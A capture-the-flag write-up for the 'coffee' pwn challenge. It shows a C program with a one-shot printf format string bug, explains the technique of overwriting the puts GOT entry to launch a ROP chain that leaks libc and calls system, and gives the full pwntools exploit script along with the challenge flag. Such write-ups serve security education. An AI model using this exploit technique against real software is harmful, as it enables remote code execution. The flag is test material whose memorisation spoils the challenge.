# coffee

Disclaimer:
I was not able to solve this challenge during the CTF.
The challenge had me frustrated for most of the event due to the restrictions on the format string bug.
I solved it with the help of [moratorium08's writeup](https://hackmd.io/@moratorium08/ryMcaePVY).
I am documenting the solution here because I think it may be a useful resource in the future.

## Challenge

A very simple program with a format string vulnerability.

The program makes it much harder to call `printf` more than once as it checks the value of a global variable, which is set to 0 after the first call.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Source

```c
#include <stdio.h>

int x = 0xc0ffee;
int main(void) {
    char buf[160];
    scanf("%159s", buf);
    if (x == 0xc0ffee) {
        printf(buf);
        x = 0;
    }
    puts("bye");
}
```

## Solution

The restrictions on the `printf` call mean we must set up and execute our ropchain using only the one call.

Since our payload is written to the top of the stack, we can write our ropchain immediately after the format specifiers of our format string payload.
To execute the ropchain, we have to pop all the values of the format string payload to reach the ropchain.
This can be done by overwriting the `puts` GOT entry with the address of the `pop5` gadget.

Once this is overwritten, the first 4 qwords on the stack will be popped and our ropchain starting on `rsp+0x20` will be executed.
From here, we can exploit the program as if we had a regular stack-based buffer overflow vulnerability, by leaking the libc address and calling `system("/bin/sh\x00")`.

However, I found the solution in [moratorium08's writeup](https://hackmd.io/@moratorium08/ryMcaePVY) quite interesting, and used it when writing my own exploit.

The solution does not require another loop through `main` as it uses `scanf` in the ropchain to overwrite the `puts` GOT entry again, after leaking libc.
On this second overwrite, `puts` is replaced with `system`, and the PLT is called after setting registers in order to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 34.146.101.4 --port 30002 coffee
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('coffee')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '34.146.101.4'
port = int(args.PORT or 30002)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

rop = ROP(exe)

def exec_fmt(payload):
    p = process(exe.path)
    p.sendline(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)

str__159s = 0x403004

ropchain = flat({
    0x0: [
        rop.find_gadget(['pop rdi', 'ret'])[0],
        str__159s,
        rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0],
        exe.got['puts'],
        0,
        rop.find_gadget(['ret'])[0],
        exe.plt['__isoc99_scanf'],
        rop.find_gadget(['pop rdi', 'ret'])[0],
        exe.got['puts'] + 9,
        rop.find_gadget(['ret'])[0],
        exe.plt['puts']
        ],
    })

fmtstr = fmtstr_payload(autofmt.offset + len(ropchain)//8, {
    exe.got["puts"]: rop.find_gadget(['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'])[0]
    }, write_size='short')

payload = flat({
    0x0: fmtstr[0:0x20-6],
    0x20-6: b'%29$p\x00',
    0x20: [
        ropchain,
        fmtstr[0x20:],
        ],
    })

io.sendline(payload)

io.recvuntil(b'0x')
libc.address = int(io.recv(12), 16) - libc.libc_start_main_return

io.success(hex(libc.address))

io.sendline(pack(libc.sym['system']) + b"//bin/sh\x00")

io.interactive()
```

## Flag

`TSGCTF{Uhouho_gori_gori_pwn}`
